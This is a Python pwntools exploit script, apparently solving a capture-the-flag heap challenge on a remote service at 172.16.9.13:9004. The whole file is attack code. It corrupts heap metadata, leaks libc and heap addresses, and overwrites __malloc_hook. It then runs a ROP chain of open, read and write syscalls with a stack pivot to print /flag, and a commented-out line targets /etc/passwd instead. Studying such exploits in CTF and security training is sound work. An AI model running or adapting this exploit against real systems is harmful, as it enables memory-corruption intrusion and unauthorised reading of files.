#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
from os import sys
context.binary = "./pwn"
elf = context.binary
# libc = elf.libc
libc = ELF("./libc-2.31.so", checksec = False)
# context.log_level = "debug"

def DEBUG():
    info("free @ {:#x}".format(0x401667))
    info("edit @ {:#x}".format(0x401712))
    info("add @ {:#x}".format(0x401586))
    info("show @ {:#x}".format(0x40177D))
    pause()

def add(idx, size, name):
    io.sendlineafter("Choice:\n", "1")
    io.sendlineafter("index>> ", str(idx))
    io.sendlineafter("size>> ", str(size))
    io.sendafter("name>> ", name)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("Choice:\n", "2")
    io.sendlineafter("index>> ", str(idx))

def edit(idx, name):
    io.sendlineafter("Choice:\n", "3")
    io.sendlineafter("index>> ", str(idx))
    io.sendafter("name>> ", name)
    sleep(0.01)

def show(idx):
    io.sendlineafter("Choice:\n", "5")
    io.sendlineafter("index>> ", str(idx))


# io = process(elf.path, env = {"LD_PRELOAD": libc.path})
#  io = process(elf.path)
io = remote("172.16.9.13", 9004)

add(0, 0x428, "0")  # p1
add(1, 0x68, '1' * 8)   # g1
add(11, 0x68, '1' * 8)   # g1
add(12, 0x68, '1' * 8)   # g1
add(13, 0x68, '1' * 8)   # g1
add(14, 0x68, '1' * 8)   # g1
add(15, 0x68, '1' * 8)   # g1
add(16, 0x68, '1' * 8)   # g1
add(17, 0x68, '1' * 8)   # g1
add(2, 0x418, '2' * 8 + "/home/pwn/flag\0")  # p2
add(3, 0x18, '3' * 8)   # g2

delete(0)               # p1
add(4, 0x438, '4' * 8)  # g3
delete(2)               # p2

# DEBUG()                 # p1
edit(0, flat(0, 0, 0, 0x404080 - 4 * 8))
add(5, 0x438, '5' * 8)  # g4

add(6, 0x500, '6' * 8)
add(7, 0x500, '7' * 8)
delete(6)
show(6)
# libc.address = u64(io.recvuntil("\x7f")[-6: ] + b"\0\0") - 96 - libc.sym["main_arena"]
libc.address = u64(io.recvuntil("\x7f")[-6: ] + b"\0\0") - 0x1ebbe0
info("libc @ {:#x}".format(libc.address))

# add(10, 0x500, 'a' * 8)
delete(1)
delete(11)
delete(12)
delete(13)
delete(14)
delete(15)
delete(16)
delete(17)

show(0)
# add(19, 0x510, cyclic(n = 8, length = 0x200))
heap = u64(io.recvuntil("\n", drop = True).ljust(8, b'\0')) - 0xa40
info("heap @ {:#x}".format(heap))
edit(17, flat(libc.sym["__malloc_hook"] - 0x40 + 8 + 5))

rop = flat(
        libc.address + 0x000000000004a550, # pop rax; ret;
        0x101,
        libc.address + 0x0000000000026b72, # pop rdi; ret;
        -2,
        libc.address + 0x0000000000027529, # pop rsi; ret;
        heap + 0x6b8,
        libc.address + 0x000000000011c1e1, # pop rdx; pop r12; ret;
        0,
        0,
        libc.address + 0x0000000000066229, # syscall; ret;


        libc.address + 0x000000000004a550, # pop rax; ret;
        0,
        libc.address + 0x0000000000026b72, # pop rdi; ret;
        3,
        libc.address + 0x0000000000027529, # pop rsi; ret;
        heap,
        libc.address + 0x000000000011c1e1, # pop rdx; pop r12; ret;
        0x100,
        0,
        libc.address + 0x0000000000066229, # syscall; ret;
       
        libc.address + 0x000000000004a550, # pop rax; ret;
        1,
        libc.address + 0x0000000000026b72, # pop rdi; ret;
        1,
        libc.address + 0x0000000000027529, # pop rsi; ret;
        heap,
        libc.address + 0x000000000011c1e1, # pop rdx; pop r12; ret;
        0x100,
        0,
        libc.address + 0x0000000000066229, # syscall; ret;
 

        )
assert len(rop) <= 0x418
rop = rop.ljust(0x418, b"\0")
rop += b"/flag\0"
# rop += b"/etc/passwd\0"
# add(8, 0x68, flat(cyclic(n = 8, length = 0x68)))
# DEBUG()
edit(0, rop)
# add(19, 0x420, cyclic(n = 8, length = 0x200))
add(8, 0x68, '0')
# DEBUG()
add(9, 0x68, flat('\0' * 35, 0x00000000004013ba))# xchg rdi, rsp; nop; pop rbp; ret;))
# add(18, heap + 0x2a0 - 8, flat(cyclic(n = 8, length = 0x300)))
io.sendlineafter("Choice:\n", "1")
io.sendlineafter("index>> ", str(18))
io.sendlineafter("size>> ", str(heap + 0x2a0 - 8))
# io.sendafter("name>> ", name)
#  print(hexdump(io.recvall()))

io.interactive()
